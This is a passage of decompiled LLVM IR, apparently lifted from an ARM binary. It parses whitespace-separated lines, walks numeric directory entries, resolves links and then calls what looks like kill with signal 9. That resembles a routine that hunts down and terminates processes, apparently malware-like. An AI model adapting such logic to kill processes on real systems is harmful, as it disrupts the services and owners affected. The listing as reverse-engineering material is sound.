dec_label_pc_e624.backedge:                       ; preds = %dec_label_pc_e674, %dec_label_pc_e74c, %dec_label_pc_e798, %dec_label_pc_e6c0
  %v0_e62c = load i32, i32* @r8, align 4
  %v4_e630 = call i32 @function_12f34(i8* nonnull %stack_var_-581, i32 512, i32 %v0_e62c)
  %v2_e634 = icmp eq i32 %v4_e630, 0
  br i1 %v2_e634, label %dec_label_pc_e7c4.loopexit, label %dec_label_pc_e63c

dec_label_pc_e67c:                                ; preds = %dec_label_pc_e674
  %v1_e680 = add i32 %v1_e6a0, 2
  %v2_e688 = add i32 %v1_e680, %v2_e684
  %v1_e68c = add i32 %v2_e688, -545
  %v2_e68c = inttoptr i32 %v1_e68c to i8*
  %v3_e68c = load i8, i8* %v2_e68c, align 1
  %v2_e690 = icmp eq i8 %v3_e68c, 0
  br i1 %v2_e690, label %bb133, label %bb132

bb132:                                            ; preds = %dec_label_pc_e67c
  %v8_e694 = icmp eq i8 %v3_e68c, 32
  br i1 %v8_e694, label %.thread10, label %dec_label_pc_e6a0

.thread10:                                        ; preds = %bb132
  store i32 %v1_e680, i32* @r5, align 4
  br label %dec_label_pc_e6c0

bb133:                                            ; preds = %dec_label_pc_e67c
  store i32 %v1_e680, i32* @r5, align 4
  br label %dec_label_pc_e6c0

dec_label_pc_e6a0:                                ; preds = %bb132
  %v0_e6a0 = load i32, i32* @r6, align 4
  %v2_e6a0 = add i32 %v0_e6a0, %v1_e6a0
  br label %dec_label_pc_e6a4

dec_label_pc_e6a4:                                ; preds = %bb134, %dec_label_pc_e6a0
  %v0_e6b013 = phi i32 [ %v1_e6b0, %bb134 ], [ %v2_e6a0, %dec_label_pc_e6a0 ]
  %v1_e6a4 = add i32 %v0_e6b013, 3
  %v2_e6a4 = inttoptr i32 %v1_e6a4 to i8*
  %v3_e6a4 = load i8, i8* %v2_e6a4, align 1
  %v2_e6a8 = icmp eq i8 %v3_e6a4, 0
  br i1 %v2_e6a8, label %.thread12, label %bb134

.thread12:                                        ; preds = %dec_label_pc_e6a4
  %v1_e6b014 = add i32 %v0_e6b013, 1
  br label %dec_label_pc_e6b8

bb134:                                            ; preds = %dec_label_pc_e6a4
  %v8_e6ac = icmp eq i8 %v3_e6a4, 32
  %v1_e6b0 = add i32 %v0_e6b013, 1
  br i1 %v8_e6ac, label %dec_label_pc_e6b8, label %dec_label_pc_e6a4

dec_label_pc_e6b8:                                ; preds = %bb134, %.thread12
  %v1_e6b015 = phi i32 [ %v1_e6b014, %.thread12 ], [ %v1_e6b0, %bb134 ]
  %v2_e6b8 = sub i32 %v1_e6b015, %v0_e6a0
  %v1_e6bc = add i32 %v2_e6b8, 2
  store i32 %v1_e6bc, i32* @r5, align 4
  br label %dec_label_pc_e6c0

dec_label_pc_e6c0:                                ; preds = %bb133, %.thread10, %dec_label_pc_e6b8
  %v1_e6cc = phi i32 [ %v1_e680, %.thread10 ], [ %v1_e680, %bb133 ], [ %v1_e6bc, %dec_label_pc_e6b8 ]
  %v0_e6c0 = load i32, i32* @r6, align 4
  %v2_e6c0 = add i32 %v0_e6c0, %v1_e680
  store i32 %v2_e6c0, i32* @r4, align 4
  %v2_e6cc = add i32 %v1_e6cc, %v2_e684
  store i32 0, i32* @r7, align 4
  %v3_e6d8 = add i32 %v2_e6cc, -545
  %v4_e6d8 = inttoptr i32 %v3_e6d8 to i8*
  store i8 0, i8* %v4_e6d8, align 1
  %v1_e6dc = inttoptr i32 %v2_e6c0 to i8*
  %v2_e6dc = call i32 @function_12cdc(i8* %v1_e6dc)
  store i32 %v2_e6dc, i32* @r1, align 4
  %v0_e6e8 = load i32, i32* @r4, align 4
  %v3_e6ec = inttoptr i32 %v0_e6e8 to i8*
  %v4_e6ec = call i32 @function_13030(i8* %v3_e6ec, i32 %v2_e6dc, i32 %v2_e5b8)
  %v7_e6f0 = icmp eq i32 %v4_e6ec, -1
  br i1 %v7_e6f0, label %dec_label_pc_e624.backedge, label %dec_label_pc_e70c.preheader

dec_label_pc_e70c.preheader:                      ; preds = %dec_label_pc_e6c0
  %v1_e6f4 = load i32, i32* @r7, align 4
  %v1_e6f8 = load i32, i32* @r6, align 4
  %v2_e6f8 = load i32, i32* @r5, align 4
  %v3_e6f8 = add i32 %v2_e6f8, %v1_e6f8
  store i32 %v1_e6f4, i32* @lr, align 4
  store i32 %v1_e6f4, i32* @r4, align 4
  %v1_e70c50 = add i32 %v3_e6f8, 2
  %v2_e70c51 = inttoptr i32 %v1_e70c50 to i8*
  %v3_e70c52 = load i8, i8* %v2_e70c51, align 1
  %v2_e71054 = icmp eq i8 %v3_e70c52, 0
  %v1_e71456 = add i32 %v2_e6f8, 2
  br i1 %v2_e71054, label %dec_label_pc_e74c, label %dec_label_pc_e71c

dec_label_pc_e71c:                                ; preds = %dec_label_pc_e70c.preheader, %dec_label_pc_e70c.backedge
  %v0_e74c86 = phi i32 [ %v0_e74c85, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_e734.pr = phi i32 [ %v0_e734.pr71, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_ea50 = phi i32 [ %v0_ea5074, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_e71482 = phi i32 [ %v1_e714, %dec_label_pc_e70c.backedge ], [ %v1_e71456, %dec_label_pc_e70c.preheader ]
  %v0_e744 = phi i32 [ %v0_e70c, %dec_label_pc_e70c.backedge ], [ %v3_e6f8, %dec_label_pc_e70c.preheader ]
  %v1_e720.in = phi i8 [ %v3_e70c, %dec_label_pc_e70c.backedge ], [ %v3_e70c52, %dec_label_pc_e70c.preheader ]
  %v7_e71c = icmp eq i8 %v1_e720.in, 9
  br i1 %v7_e71c, label %.thread23, label %bb135

bb135:                                            ; preds = %dec_label_pc_e71c
  %v8_e720 = icmp eq i8 %v1_e720.in, 32
  br i1 %v8_e720, label %.thread23.thread35, label %dec_label_pc_e734

.thread23.thread35:                               ; preds = %bb135
  br label %dec_label_pc_e740

.thread23:                                        ; preds = %dec_label_pc_e71c
  br label %dec_label_pc_e740

dec_label_pc_e734:                                ; preds = %bb135
  %v7_e734 = icmp eq i32 %v0_e734.pr, 1
  br i1 %v7_e734, label %dec_label_pc_ea50, label %dec_label_pc_e73c

dec_label_pc_e73c:                                ; preds = %dec_label_pc_ea50, %dec_label_pc_e734
  %v0_e74079 = phi i32 [ %v1_ea50, %dec_label_pc_ea50 ], [ %v0_ea50, %dec_label_pc_e734 ]
  br label %dec_label_pc_e740

dec_label_pc_e740:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_e73c
  %v0_e740 = phi i32 [ %v0_ea50, %.thread23.thread35 ], [ %v0_ea50, %.thread23 ], [ %v0_e74079, %dec_label_pc_e73c ]
  %v0_e734.pr72 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_e73c ]
  %v7_e748 = icmp sgt i32 %v0_e740, 6
  br i1 %v7_e748, label %dec_label_pc_e74c, label %dec_label_pc_e70c.backedge

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e70c.backedge, %dec_label_pc_e740, %dec_label_pc_e70c.preheader
  %v1_e79c = phi i32 [ %v1_e71456, %dec_label_pc_e70c.preheader ], [ %v1_e714, %dec_label_pc_e70c.backedge ], [ %v0_e71482, %dec_label_pc_e740 ]
  %v0_e74c = phi i32 [ %v1_e6f4, %dec_label_pc_e70c.preheader ], [ %v0_e74c85, %dec_label_pc_e70c.backedge ], [ %v0_e74c86, %dec_label_pc_e740 ]
  %v2_e74c = icmp eq i32 %v0_e74c, 0
  br i1 %v2_e74c, label %dec_label_pc_e624.backedge, label %dec_label_pc_e758

dec_label_pc_e758:                                ; preds = %dec_label_pc_e74c
  %v2_e760 = add i32 %v1_e79c, %v2_e684
  %v1_e764 = add i32 %v2_e760, -545
  %v2_e764 = inttoptr i32 %v1_e764 to i8*
  %v3_e764 = load i8, i8* %v2_e764, align 1
  %v2_e768 = icmp eq i8 %v3_e764, 0
  br i1 %v2_e768, label %dec_label_pc_e798, label %bb136

bb136:                                            ; preds = %dec_label_pc_e758
  %v8_e76c = icmp eq i8 %v3_e764, 32
  br i1 %v8_e76c, label %dec_label_pc_e798, label %dec_label_pc_e774

dec_label_pc_e774:                                ; preds = %bb136
  %v2_e774 = add i32 %v1_e79c, %v1_e6f8
  br label %dec_label_pc_e778

dec_label_pc_e778:                                ; preds = %bb137, %dec_label_pc_e774
  %v0_e78428 = phi i32 [ %v1_e784, %bb137 ], [ %v1_e79c, %dec_label_pc_e774 ]
  %v0_e778 = phi i32 [ %v1_e778, %bb137 ], [ %v2_e774, %dec_label_pc_e774 ]
  %v1_e778 = add i32 %v0_e778, 1
  %v2_e778 = inttoptr i32 %v1_e778 to i8*
  %v3_e778 = load i8, i8* %v2_e778, align 1
  %v2_e77c = icmp eq i8 %v3_e778, 0
  br i1 %v2_e77c, label %.thread27, label %bb137

.thread27:                                        ; preds = %dec_label_pc_e778
  %v1_e78429 = add i32 %v0_e78428, 1
  br label %dec_label_pc_e78c

bb137:                                            ; preds = %dec_label_pc_e778
  %v8_e780 = icmp eq i8 %v3_e778, 32
  %v1_e784 = add i32 %v0_e78428, 1
  br i1 %v8_e780, label %dec_label_pc_e78c, label %dec_label_pc_e778

dec_label_pc_e78c:                                ; preds = %bb137, %.thread27
  %v1_e794 = phi i32 [ %v1_e78429, %.thread27 ], [ %v1_e784, %bb137 ]
  %v2_e794 = add i32 %v1_e794, %v2_e684
  br label %dec_label_pc_e798

dec_label_pc_e798:                                ; preds = %dec_label_pc_e758, %bb136, %dec_label_pc_e78c
  %v2_e7a4 = phi i32 [ %v2_e760, %dec_label_pc_e758 ], [ %v2_e760, %bb136 ], [ %v2_e794, %dec_label_pc_e78c ]
  %v2_e79c = add i32 %v1_e79c, %v1_e6f8
  store i32 %v2_e79c, i32* @r4, align 4
  %v3_e7a4 = add i32 %v2_e7a4, -545
  %v4_e7a4 = inttoptr i32 %v3_e7a4 to i8*
  store i8 0, i8* %v4_e7a4, align 1
  %v1_e7a8 = inttoptr i32 %v2_e79c to i8*
  %v2_e7a8 = call i32 @function_12cdc(i8* %v1_e7a8)
  %v8_e7b0 = icmp sgt i32 %v2_e7a8, 15
  br i1 %v8_e7b0, label %dec_label_pc_e624.backedge, label %dec_label_pc_e7b4

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e798
  %v0_e7b8 = load i32, i32* @r4, align 4
  %v2_e7bc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e7bc, i32* @r0, align 4
  %v2_e7c0 = bitcast i32* %stack_var_-52 to i8*
  %v3_e7c0 = call i32 @function_12d04(i8* %v2_e7c0, i32 %v0_e7b8)
  br label %dec_label_pc_e7c4

dec_label_pc_e7c4.loopexit:                       ; preds = %dec_label_pc_e624.backedge, %dec_label_pc_e624.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre99 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_e7c4

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e7c4.loopexit, %dec_label_pc_e7b4
  %v1_e7d4.pre-phi = phi i8* [ %.pre99, %dec_label_pc_e7c4.loopexit ], [ %v2_e7c0, %dec_label_pc_e7b4 ]
  %v2_e7d0.pre-phi = phi i32 [ %.pre, %dec_label_pc_e7c4.loopexit ], [ %v2_e7bc, %dec_label_pc_e7b4 ]
  %v0_e7c4 = load i32, i32* @r8, align 4
  %v1_e7c8 = call i32 @function_1369c(i32 %v0_e7c4)
  %v2_e7d4 = call i32 @function_12cdc(i8* %v1_e7d4.pre-phi)
  store i32 %v2_e7d4, i32* @r4, align 4
  %v2_e7d8 = icmp eq i32 %v2_e7d4, 0
  br i1 %v2_e7d8, label %dec_label_pc_ea28, label %dec_label_pc_e7e0

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e7c4
  %v3_e7e8 = call i32 @function_122cc(i32 6, i32* null)
  store i32 %v3_e7e8, i32* @r0, align 4
  %v1_e7ec = call i32 @function_13aa4(i32 %v3_e7e8)
  store i32 %v1_e7ec, i32* @r8, align 4
  %v2_e7f0 = icmp eq i32 %v1_e7ec, 0
  br i1 %v2_e7f0, label %dec_label_pc_ea20, label %dec_label_pc_e800.preheader

dec_label_pc_e800.preheader:                      ; preds = %dec_label_pc_e7e0
  store i32 0, i32* @r5, align 4
  %v1_e80445 = inttoptr i32 %v1_e7ec to i32*
  %v2_e80446 = call i32 @function_13ba0(i32* %v1_e80445)
  %v2_e80848 = icmp eq i32 %v2_e80446, 0
  br i1 %v2_e80848, label %dec_label_pc_ea14, label %dec_label_pc_e810.preheader

dec_label_pc_e800.loopexit:                       ; preds = %dec_label_pc_e818, %dec_label_pc_e82c, %dec_label_pc_e894
  %v0_e800 = load i32, i32* @r8, align 4
  %v1_e804 = inttoptr i32 %v0_e800 to i32*
  %v2_e804 = call i32 @function_13ba0(i32* %v1_e804)
  %v2_e808 = icmp eq i32 %v2_e804, 0
  br i1 %v2_e808, label %dec_label_pc_ea14, label %dec_label_pc_e810.preheader

dec_label_pc_e810.preheader:                      ; preds = %dec_label_pc_e800.preheader, %dec_label_pc_e800.loopexit
  %v0_e81894 = phi i32 [ %v2_e804, %dec_label_pc_e800.loopexit ], [ %v2_e80446, %dec_label_pc_e800.preheader ]
  br label %dec_label_pc_e810

dec_label_pc_e810:                                ; preds = %dec_label_pc_e810.preheader, %dec_label_pc_e9fc
  %v0_e824 = phi i32 [ %v0_e81894, %dec_label_pc_e810.preheader ], [ %v2_ea08, %dec_label_pc_e9fc ]
  %v0_e810 = load i32, i32* @r5, align 4
  %v2_e810 = icmp eq i32 %v0_e810, 0
  br i1 %v2_e810, label %dec_label_pc_e818, label %dec_label_pc_ea14

dec_label_pc_e818:                                ; preds = %dec_label_pc_e810
  %v1_e818 = add i32 %v0_e824, 11
  %v2_e818 = inttoptr i32 %v1_e818 to i8*
  %v3_e818 = load i8, i8* %v2_e818, align 1
  %v4_e818 = zext i8 %v3_e818 to i32
  %v1_e81c = add nsw i32 %v4_e818, -48
  store i32 %v1_e818, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_e81c, 9
  br i1 %tmp, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e82c

dec_label_pc_e82c:                                ; preds = %dec_label_pc_e818
  %v3_e834 = call i32 @function_122cc(i32 6, i32* null)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e840 = call i32 @function_12d04(i8* %v2_e578, i32 %v3_e834)
  %v2_e848 = call i32 @function_12cdc(i8* %v2_e578)
  %v0_e84c = load i32, i32* @r7, align 4
  %v0_e850 = load i32, i32* @sl, align 4
  %v2_e850 = add i32 %v0_e850, %v2_e848
  store i32 %v2_e850, i32* @r0, align 4
  %v2_e854 = inttoptr i32 %v2_e850 to i8*
  %v3_e854 = call i32 @function_12d04(i8* %v2_e854, i32 %v0_e84c)
  %v2_e85c = call i32 @function_12cdc(i8* %v2_e578)
  %v0_e860 = load i32, i32* @r5, align 4
  store i32 %v2_e85c, i32* @r4, align 4
  %v2_e86c = inttoptr i32 %v0_e860 to i32*
  %v3_e86c = call i32 @function_122cc(i32 7, i32* %v2_e86c)
  %v0_e874 = load i32, i32* @sl, align 4
  %v1_e874 = load i32, i32* @r4, align 4
  %v2_e874 = add i32 %v1_e874, %v0_e874
  store i32 %v2_e874, i32* @r0, align 4
  %v2_e878 = inttoptr i32 %v2_e874 to i8*
  %v3_e878 = call i32 @function_12d04(i8* %v2_e878, i32 %v3_e86c)
  %v4_e888 = call i32 @function_13890(i8* %v2_e578, i32 %v2_e56c, i32 4096)
  %v7_e88c = icmp eq i32 %v4_e888, -1
  br i1 %v7_e88c, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %dec_label_pc_e82c
  %v0_e894 = load i32, i32* @r5, align 4
  %v2_e89c = inttoptr i32 %v0_e894 to i32*
  %v3_e89c = call i32 @function_122cc(i32 6, i32* %v2_e89c)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e8a8 = call i32 @function_12d04(i8* %v2_e578, i32 %v3_e89c)
  %v2_e8b0 = call i32 @function_12cdc(i8* %v2_e578)
  %v0_e8b4 = load i32, i32* @r7, align 4
  %v0_e8b8 = load i32, i32* @sl, align 4
  %v2_e8b8 = add i32 %v0_e8b8, %v2_e8b0
  store i32 %v2_e8b8, i32* @r0, align 4
  %v2_e8bc = inttoptr i32 %v2_e8b8 to i8*
  %v3_e8bc = call i32 @function_12d04(i8* %v2_e8bc, i32 %v0_e8b4)
  %v2_e8c4 = call i32 @function_12cdc(i8* %v2_e578)
  %v0_e8c8 = load i32, i32* @r5, align 4
  store i32 %v2_e8c4, i32* @r4, align 4
  %v2_e8d4 = inttoptr i32 %v0_e8c8 to i32*
  %v3_e8d4 = call i32 @function_122cc(i32 9, i32* %v2_e8d4)
  %v0_e8dc = load i32, i32* @sl, align 4
  %v1_e8dc = load i32, i32* @r4, align 4
  %v2_e8dc = add i32 %v1_e8dc, %v0_e8dc
  store i32 %v2_e8dc, i32* @r0, align 4
  %v2_e8e0 = inttoptr i32 %v2_e8dc to i8*
  %v3_e8e0 = call i32 @function_12d04(i8* %v2_e8e0, i32 %v3_e8d4)
  store i32 %v2_e558, i32* @r0, align 4
  %v1_e8e8 = call i32 @function_13aa4(i32 %v2_e558)
  store i32 %v1_e8e8, i32* @sb, align 4
  %v2_e8ec = icmp eq i32 %v1_e8e8, 0
  br i1 %v2_e8ec, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e8f4.preheader

dec_label_pc_e8f4.preheader:                      ; preds = %dec_label_pc_e894
  %v1_e8f840 = inttoptr i32 %v1_e8e8 to i32*
  %v2_e8f841 = call i32 @function_13ba0(i32* %v1_e8f840)
  store i32 %v2_e8f841, i32* @r6, align 4
  %v2_e8fc43 = icmp eq i32 %v2_e8f841, 0
  br i1 %v2_e8fc43, label %dec_label_pc_e9fc, label %dec_label_pc_e90cthread-pre-split

dec_label_pc_e8f4.loopexit:                       ; preds = %dec_label_pc_e914, %dec_label_pc_e9ac
  %v0_e8f4 = load i32, i32* @sb, align 4
  %v1_e8f8 = inttoptr i32 %v0_e8f4 to i32*
  %v2_e8f8 = call i32 @function_13ba0(i32* %v1_e8f8)
  store i32 %v2_e8f8, i32* @r6, align 4
  %v2_e8fc = icmp eq i32 %v2_e8f8, 0
  br i1 %v2_e8fc, label %dec_label_pc_e9fc, label %dec_label_pc_e90cthread-pre-split

dec_label_pc_e90cthread-pre-split:                ; preds = %dec_label_pc_e8f4.preheader, %dec_label_pc_e8f4.loopexit
  %v0_e90c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e90c

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e90cthread-pre-split, %dec_label_pc_e9d4
  %v0_e90c = phi i32 [ %v0_e90c.pr, %dec_label_pc_e90cthread-pre-split ], [ 1, %dec_label_pc_e9d4 ]
  %v2_e90c = icmp eq i32 %v0_e90c, 0
  br i1 %v2_e90c, label %dec_label_pc_e914, label %dec_label_pc_e9fc

dec_label_pc_e914:                                ; preds = %dec_label_pc_e90c
  %v2_e914 = call i32 @function_12d7c(i32 %v2_e56c, i32 4096)
  %v0_e918 = load i32, i32* @r5, align 4
  %v2_e920 = inttoptr i32 %v0_e918 to i32*
  %v3_e920 = call i32 @function_122cc(i32 6, i32* %v2_e920)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e92c = call i32 @function_12d04(i8* %v2_e578, i32 %v3_e920)
  %v2_e934 = call i32 @function_12cdc(i8* %v2_e578)
  %v0_e938 = load i32, i32* @r7, align 4
  %v0_e93c = load i32, i32* @sl, align 4
  %v2_e93c = add i32 %v0_e93c, %v2_e934
  store i32 %v2_e93c, i32* @r0, align 4
  %v2_e940 = inttoptr i32 %v2_e93c to i8*
  %v3_e940 = call i32 @function_12d04(i8* %v2_e940, i32 %v0_e938)
  %v2_e948 = call i32 @function_12cdc(i8* %v2_e578)
  %v0_e94c = load i32, i32* @r5, align 4
  store i32 %v2_e948, i32* @r4, align 4
  %v2_e958 = inttoptr i32 %v0_e94c to i32*
  %v3_e958 = call i32 @function_122cc(i32 9, i32* %v2_e958)
  %v0_e960 = load i32, i32* @sl, align 4
  %v1_e960 = load i32, i32* @r4, align 4
  %v2_e960 = add i32 %v1_e960, %v0_e960
  store i32 %v2_e960, i32* @r0, align 4
  %v2_e964 = inttoptr i32 %v2_e960 to i8*
  %v3_e964 = call i32 @function_12d04(i8* %v2_e964, i32 %v3_e958)
  %v2_e96c = call i32 @function_12cdc(i8* %v2_e578)
  %v0_e974 = load i32, i32* @sl, align 4
  %v2_e974 = add i32 %v0_e974, %v2_e96c
  store i32 %v2_e974, i32* @r0, align 4
  %v2_e978 = inttoptr i32 %v2_e974 to i8*
  %v3_e978 = call i32 @function_12d04(i8* %v2_e978, i32 ptrtoint ([2 x i8]* @global_var_15f60.23 to i32))
  %v2_e980 = call i32 @function_12cdc(i8* %v2_e578)
  %v0_e984 = load i32, i32* @r6, align 4
  %v1_e984 = add i32 %v0_e984, 11
  %v0_e988 = load i32, i32* @sl, align 4
  %v2_e988 = add i32 %v0_e988, %v2_e980
  store i32 %v2_e988, i32* @r0, align 4
  %v2_e98c = inttoptr i32 %v2_e988 to i8*
  %v3_e98c = call i32 @function_12d04(i8* %v2_e98c, i32 %v1_e984)
  %v4_e99c = call i32 @function_13890(i8* %v2_e578, i32 %v2_e56c, i32 4096)
  %v7_e9a0 = icmp eq i32 %v4_e99c, -1
  br i1 %v7_e9a0, label %dec_label_pc_e8f4.loopexit, label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e914
  %v2_e9ac = call i32 @function_12cdc(i8* %v2_e590)
  store i32 %v2_e9ac, i32* @r1, align 4
  %v4_e9c0 = call i32 @function_13030(i8* %v2_e590, i32 %v2_e9ac, i32 %v2_e7d0.pre-phi)
  %v7_e9c4 = icmp eq i32 %v4_e9c0, -1
  br i1 %v7_e9c4, label %dec_label_pc_e8f4.loopexit, label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9ac
  %v0_e9cc = load i32, i32* @r7, align 4
  %v2_e9d4 = inttoptr i32 %v0_e9cc to i8*
  %v3_e9d4 = call i32 @function_12e08(i8* %v2_e9d4, i32 10)
  %v2_e9dc = call i32 @function_1379c(i32 %v3_e9d4, i32 9)
  %v0_e9e0 = load i32, i32* @sb, align 4
  %v1_e9e4 = inttoptr i32 %v0_e9e0 to i32*
  %v2_e9e4 = call i32 @function_13ba0(i32* %v1_e9e4)
  store i32 %v2_e9e4, i32* @r6, align 4
  %v2_e9e8 = icmp eq i32 %v2_e9e4, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e9e8, label %dec_label_pc_e9fc, label %dec_label_pc_e90c

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e8f4.loopexit, %dec_label_pc_e9d4, %dec_label_pc_e90c, %dec_label_pc_e8f4.preheader
  %v0_e9fc = load i32, i32* @sb, align 4
  %v1_ea00 = inttoptr i32 %v0_e9fc to i32*
  %v2_ea00 = call i32 @function_139f0(i32* %v1_ea00)
  %v0_ea04 = load i32, i32* @r8, align 4
  %v1_ea08 = inttoptr i32 %v0_ea04 to i32*
  %v2_ea08 = call i32 @function_13ba0(i32* %v1_ea08)
  %v2_ea0c = icmp eq i32 %v2_ea08, 0
  br i1 %v2_ea0c, label %dec_label_pc_ea14, label %dec_label_pc_e810

dec_label_pc_ea14:                                ; preds = %dec_label_pc_e800.loopexit, %dec_label_pc_e9fc, %dec_label_pc_e810, %dec_label_pc_e800.preheader
  %v0_ea14 = load i32, i32* @r8, align 4
  %v1_ea18 = inttoptr i32 %v0_ea14 to i32*
  %v2_ea18 = call i32 @function_139f0(i32* %v1_ea18)
  %v0_ea1c = load i32, i32* @r5, align 4
  %v1_ea1c = urem i32 %v0_ea1c, 256
  br label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %dec_label_pc_e7e0, %dec_label_pc_ea14
  %storemerge = phi i32 [ %v1_ea1c, %dec_label_pc_ea14 ], [ 0, %dec_label_pc_e7e0 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ea24 = call i32 @function_14ac4(i32 1)
  br label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %dec_label_pc_e7c4, %dec_label_pc_ea20
  %v1_ea2c = call i32 @function_122f8(i32 6)
  %v1_ea34 = call i32 @function_122f8(i32 7)
  %v1_ea3c = call i32 @function_122f8(i32 9)
  br label %dec_label_pc_ea40

dec_label_pc_ea40:                                ; preds = %dec_label_pc_e5f4, %dec_label_pc_ea28
  %v0_ea40 = load i32, i32* @r4, align 4
  %v2_ea4c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_ea4c, i32* @r4, align 4
  store i32 %v6_e544, i32* @r5, align 4
  store i32 %v9_e544, i32* @r6, align 4
  store i32 %v12_e544, i32* @r7, align 4
  store i32 %v15_e544, i32* @r8, align 4
  store i32 %v18_e544, i32* @sb, align 4
  store i32 %v21_e544, i32* @sl, align 4
  store i32 %v24_e544, i32* @fp, align 4
  ret i32 %v0_ea40

dec_label_pc_ea50:                                ; preds = %dec_label_pc_e734
  %v1_ea50 = add i32 %v0_ea50, 1
  store i32 %v1_ea50, i32* @lr, align 4
  %v7_ea54 = icmp eq i32 %v0_ea50, 0
  br i1 %v7_ea54, label %dec_label_pc_ea5c, label %dec_label_pc_e73c

dec_label_pc_ea5c:                                ; preds = %dec_label_pc_ea50
  %v1_ea5c = add i32 %v0_e744, 3
  %v2_ea5c = inttoptr i32 %v1_ea5c to i8*
  %v3_ea5c = load i8, i8* %v2_ea5c, align 1
  %v7_ea60 = icmp eq i8 %v3_ea5c, 65
  br i1 %v7_ea60, label %dec_label_pc_ea70, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_ea5c
  br label %dec_label_pc_e70c.backedge

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea5c
  store i32 %v1_ea50, i32* @r4, align 4
  br label %dec_label_pc_e70c.backedge

dec_label_pc_e70c.backedge:                       ; preds = %.thread33, %dec_label_pc_ea70, %dec_label_pc_e740
  %v0_e74c85 = phi i32 [ %v1_ea50, %dec_label_pc_ea70 ], [ %v0_e74c86, %dec_label_pc_e740 ], [ %v0_e74c86, %.thread33 ]
  %v0_ea5074 = phi i32 [ %v1_ea50, %dec_label_pc_ea70 ], [ %v0_e740, %dec_label_pc_e740 ], [ %v1_ea50, %.thread33 ]
  %v0_e734.pr71 = phi i32 [ 0, %dec_label_pc_ea70 ], [ %v0_e734.pr72, %dec_label_pc_e740 ], [ 0, %.thread33 ]
  %v0_e70c = add i32 %v0_e744, 1
  %v1_e70c = add i32 %v0_e744, 3
  %v2_e70c = inttoptr i32 %v1_e70c to i8*
  %v3_e70c = load i8, i8* %v2_e70c, align 1
  %v2_e710 = icmp eq i8 %v3_e70c, 0
  %v1_e714 = add i32 %v0_e71482, 1
  br i1 %v2_e710, label %dec_label_pc_e74c, label %dec_label_pc_e71c

dec_label_pc_ea80:                                ; preds = %dec_label_pc_e544
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_e5f4

; uselistorder directives
  uselistorder i32 %v1_e714, { 1, 0 }
  uselistorder i8 %v3_e70c, { 1, 0 }
  uselistorder i32 %v0_e74c85, { 1, 0 }
  uselistorder i32 %v1_ea50, { 4, 3, 0, 2, 5, 1 }
  uselistorder i32 %v2_ea08, { 1, 0 }
  uselistorder i32 %v1_e778, { 1, 0 }
  uselistorder i32 %v0_e78428, { 1, 0 }
  uselistorder i32 %v1_e79c, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e740, { 1, 0 }
  uselistorder i32 %v0_e71482, { 1, 0 }
  uselistorder i32 %v0_ea50, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e74c86, { 1, 2, 0 }
  uselistorder i32 %v1_e71456, { 1, 0 }
  uselistorder i32 %v2_e6f8, { 1, 0 }
  uselistorder i32 %v1_e6f4, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v0_e6b013, { 1, 0, 2 }
  uselistorder i32 %v0_e6a0, { 1, 0 }
  uselistorder i32 %v1_e680, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v4_e614, { 1, 2, 0 }
  uselistorder i32 %v2_e56c, { 1, 0, 2 }
  uselistorder i32 %v2_e558, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-581, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_12e08, { 1, 0, 2, 4, 3 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_15f60.23 to i32), { 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_12f34, { 1, 0 }
  uselistorder label %dec_label_pc_e70c.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea40, { 1, 0 }
  uselistorder label %dec_label_pc_ea28, { 1, 0 }
  uselistorder label %dec_label_pc_ea20, { 1, 0 }
  uselistorder label %dec_label_pc_ea14, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e9fc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e90c, { 1, 0 }
  uselistorder label %dec_label_pc_e90cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e8f4.loopexit, { 1, 0 }
